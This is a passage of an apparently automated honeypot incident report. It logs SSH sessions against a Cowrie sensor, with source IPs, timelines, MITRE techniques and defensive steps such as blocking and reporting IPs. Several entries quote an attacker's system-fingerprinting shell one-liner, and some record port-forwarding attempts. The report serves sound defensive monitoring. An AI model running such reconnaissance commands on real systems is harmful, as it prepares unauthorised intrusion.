| `2026-07-28 14:53:45` | `cowrie.command.input` |
| `2026-07-28 14:53:45` | `cowrie.command.input` |
| `2026-07-28 14:53:45` | `cowrie.command.input` |
| `2026-07-28 14:53:45` | `cowrie.command.input` |
| `2026-07-28 14:53:45` | `cowrie.command.success` |
| `2026-07-28 14:53:45` | `cowrie.command.input` |
| `2026-07-28 14:53:45` | `cowrie.command.input` |
| `2026-07-28 14:53:45` | `cowrie.command.input` |
| `2026-07-28 14:53:45` | `cowrie.command.input` |
| `2026-07-28 14:53:46` | `cowrie.log.closed` |
| `2026-07-28 14:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3829c28873f0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:55 |
| **Last Seen** | 2026-07-28 14:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:55:00` | `cowrie.session.connect` |
| `2026-07-28 14:55:00` | `cowrie.client.version` |
| `2026-07-28 14:55:00` | `cowrie.client.kex` |
| `2026-07-28 14:55:01` | `cowrie.login.success` |
| `2026-07-28 14:55:02` | `cowrie.session.params` |
| `2026-07-28 14:55:02` | `cowrie.command.input` |
| `2026-07-28 14:55:02` | `cowrie.command.input` |
| `2026-07-28 14:55:03` | `cowrie.command.input` |
| `2026-07-28 14:55:03` | `cowrie.command.input` |
| `2026-07-28 14:55:03` | `cowrie.command.input` |
| `2026-07-28 14:55:03` | `cowrie.command.success` |
| `2026-07-28 14:55:03` | `cowrie.command.input` |
| `2026-07-28 14:55:03` | `cowrie.command.input` |
| `2026-07-28 14:55:03` | `cowrie.command.input` |
| `2026-07-28 14:55:03` | `cowrie.command.input` |
| `2026-07-28 14:55:03` | `cowrie.log.closed` |
| `2026-07-28 14:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ef1a2b8a9c

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-07-28 14:55 |
| **Last Seen** | 2026-07-28 14:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:55:13` | `cowrie.session.connect` |
| `2026-07-28 14:55:14` | `cowrie.client.version` |
| `2026-07-28 14:55:14` | `cowrie.client.kex` |
| `2026-07-28 14:55:19` | `cowrie.login.success` |
| `2026-07-28 14:55:20` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ef1f2820b38

| Field | Detail |
|---|---|
| **Source IP** | `213.230.65[.]53` |
| **First Seen** | 2026-07-28 14:55 |
| **Last Seen** | 2026-07-28 14:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:55:26` | `cowrie.session.connect` |
| `2026-07-28 14:55:26` | `cowrie.client.version` |
| `2026-07-28 14:55:26` | `cowrie.client.kex` |
| `2026-07-28 14:55:27` | `cowrie.login.success` |
| `2026-07-28 14:55:28` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.65[.]53` to AbuseIPDB if not already reported
- [ ] Block `213.230.65[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc26e16dd2e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:56 |
| **Last Seen** | 2026-07-28 14:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:56:20` | `cowrie.session.connect` |
| `2026-07-28 14:56:20` | `cowrie.client.version` |
| `2026-07-28 14:56:20` | `cowrie.client.kex` |
| `2026-07-28 14:56:21` | `cowrie.login.success` |
| `2026-07-28 14:56:22` | `cowrie.session.params` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:22` | `cowrie.command.success` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:22` | `cowrie.command.input` |
| `2026-07-28 14:56:23` | `cowrie.log.closed` |
| `2026-07-28 14:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7098bfc7a4c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:57 |
| **Last Seen** | 2026-07-28 14:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:57:40` | `cowrie.session.connect` |
| `2026-07-28 14:57:40` | `cowrie.client.version` |
| `2026-07-28 14:57:40` | `cowrie.client.kex` |
| `2026-07-28 14:57:41` | `cowrie.login.success` |
| `2026-07-28 14:57:42` | `cowrie.session.params` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:42` | `cowrie.command.success` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:42` | `cowrie.command.input` |
| `2026-07-28 14:57:43` | `cowrie.log.closed` |
| `2026-07-28 14:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca0d8e5e21e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 14:58 |
| **Last Seen** | 2026-07-28 14:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:58:06` | `cowrie.session.connect` |
| `2026-07-28 14:58:06` | `cowrie.client.version` |
| `2026-07-28 14:58:06` | `cowrie.client.kex` |
| `2026-07-28 14:58:06` | `cowrie.login.success` |
| `2026-07-28 14:58:06` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:58:06` | `cowrie.direct-tcpip.data` |
| `2026-07-28 14:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fb9a3d986f2

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-28 14:58 |
| **Last Seen** | 2026-07-28 14:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:58:41` | `cowrie.session.connect` |
| `2026-07-28 14:58:42` | `cowrie.client.version` |
| `2026-07-28 14:58:42` | `cowrie.client.kex` |
| `2026-07-28 14:58:44` | `cowrie.login.success` |
| `2026-07-28 14:58:45` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc73f788b58

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:58 |
| **Last Seen** | 2026-07-28 14:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:58:57` | `cowrie.session.connect` |
| `2026-07-28 14:58:57` | `cowrie.client.version` |
| `2026-07-28 14:58:57` | `cowrie.client.kex` |
| `2026-07-28 14:58:58` | `cowrie.login.success` |
| `2026-07-28 14:58:59` | `cowrie.session.params` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:58:59` | `cowrie.command.success` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:58:59` | `cowrie.command.input` |
| `2026-07-28 14:59:00` | `cowrie.log.closed` |
| `2026-07-28 14:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aad6f999cb3a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:00 |
| **Last Seen** | 2026-07-28 15:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:00:14` | `cowrie.session.connect` |
| `2026-07-28 15:00:14` | `cowrie.client.version` |
| `2026-07-28 15:00:14` | `cowrie.client.kex` |
| `2026-07-28 15:00:15` | `cowrie.login.success` |
| `2026-07-28 15:00:16` | `cowrie.session.params` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.command.success` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.command.input` |
| `2026-07-28 15:00:16` | `cowrie.log.closed` |
| `2026-07-28 15:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c8a1c074772

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:01 |
| **Last Seen** | 2026-07-28 15:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:01:34` | `cowrie.session.connect` |
| `2026-07-28 15:01:34` | `cowrie.client.version` |
| `2026-07-28 15:01:34` | `cowrie.client.kex` |
| `2026-07-28 15:01:35` | `cowrie.login.success` |
| `2026-07-28 15:01:36` | `cowrie.session.params` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:36` | `cowrie.command.success` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:36` | `cowrie.command.input` |
| `2026-07-28 15:01:37` | `cowrie.log.closed` |
| `2026-07-28 15:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c228150645c8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:02 |
| **Last Seen** | 2026-07-28 15:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:02:54` | `cowrie.session.connect` |
| `2026-07-28 15:02:54` | `cowrie.client.version` |
| `2026-07-28 15:02:54` | `cowrie.client.kex` |
| `2026-07-28 15:02:55` | `cowrie.login.success` |
| `2026-07-28 15:02:56` | `cowrie.session.params` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:56` | `cowrie.command.success` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:56` | `cowrie.command.input` |
| `2026-07-28 15:02:57` | `cowrie.log.closed` |
| `2026-07-28 15:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9afd5ea99cb3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 15:03 |
| **Last Seen** | 2026-07-28 15:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:03:22` | `cowrie.session.connect` |
| `2026-07-28 15:03:22` | `cowrie.client.version` |
| `2026-07-28 15:03:22` | `cowrie.client.kex` |
| `2026-07-28 15:03:22` | `cowrie.login.success` |
| `2026-07-28 15:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ca5577221aa

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 15:03 |
| **Last Seen** | 2026-07-28 15:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:03:22` | `cowrie.session.connect` |
| `2026-07-28 15:03:22` | `cowrie.client.version` |
| `2026-07-28 15:03:22` | `cowrie.client.kex` |
| `2026-07-28 15:03:22` | `cowrie.login.success` |
| `2026-07-28 15:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814cff9edf40

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 15:03 |
| **Last Seen** | 2026-07-28 15:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:03:24` | `cowrie.session.connect` |
| `2026-07-28 15:03:24` | `cowrie.client.version` |
| `2026-07-28 15:03:24` | `cowrie.client.kex` |
| `2026-07-28 15:03:24` | `cowrie.login.success` |
| `2026-07-28 15:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66750b9dc673

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 15:03 |
| **Last Seen** | 2026-07-28 15:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:03:24` | `cowrie.session.connect` |
| `2026-07-28 15:03:24` | `cowrie.client.version` |
| `2026-07-28 15:03:24` | `cowrie.client.kex` |
| `2026-07-28 15:03:24` | `cowrie.login.success` |
| `2026-07-28 15:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541927d009a5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:04 |
| **Last Seen** | 2026-07-28 15:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:04:09` | `cowrie.session.connect` |
| `2026-07-28 15:04:09` | `cowrie.client.version` |
| `2026-07-28 15:04:09` | `cowrie.client.kex` |
| `2026-07-28 15:04:10` | `cowrie.login.success` |
| `2026-07-28 15:04:11` | `cowrie.session.params` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:11` | `cowrie.command.success` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:11` | `cowrie.command.input` |
| `2026-07-28 15:04:12` | `cowrie.log.closed` |
| `2026-07-28 15:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b37502f8933

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:05 |
| **Last Seen** | 2026-07-28 15:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
